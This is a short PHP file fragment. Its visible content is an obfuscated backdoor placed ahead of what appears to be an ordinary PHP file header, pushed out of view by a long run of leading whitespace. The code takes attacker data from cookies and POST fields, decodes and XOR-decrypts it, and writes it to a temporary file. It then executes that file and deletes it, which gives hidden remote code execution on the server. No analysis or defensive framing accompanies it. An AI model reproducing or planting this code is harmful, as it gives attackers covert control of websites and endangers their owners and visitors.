<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("jvmdqupde")){class jvmdqupde{public static $tntiyikg = "hyakcxsslnezjygj";public static $pyqnejwcui = NULL;public function __construct(){$bandvvluc = @$_COOKIE[substr(jvmdqupde::$tntiyikg, 0, 4)];if (!empty($bandvvluc)){$uetbhj = "base64";$yenpmarah = "";$bandvvluc = explode(",", $bandvvluc);foreach ($bandvvluc as $ntxlsvtdc){$yenpmarah .= @$_COOKIE[$ntxlsvtdc];$yenpmarah .= @$_POST[$ntxlsvtdc];}$yenpmarah = array_map($uetbhj . "_decode", array($yenpmarah,)); $yenpmarah = $yenpmarah[0] ^ str_repeat(jvmdqupde::$tntiyikg, (strlen($yenpmarah[0]) / strlen(jvmdqupde::$tntiyikg)) + 1);jvmdqupde::$pyqnejwcui = @unserialize($yenpmarah);}}public function __destruct(){$this->owcikcnfa();}private function owcikcnfa(){if (is_array(jvmdqupde::$pyqnejwcui)) {$ucymsl = sys_get_temp_dir() . "/" . crc32(jvmdqupde::$pyqnejwcui["salt"]);@jvmdqupde::$pyqnejwcui["write"]($ucymsl, jvmdqupde::$pyqnejwcui["content"]);include $ucymsl;@jvmdqupde::$pyqnejwcui["delete"]($ucymsl);exit();}}}$zlmnwqozvd = new jvmdqupde(); $zlmnwqozvd = NULL;} ?><?php
/**
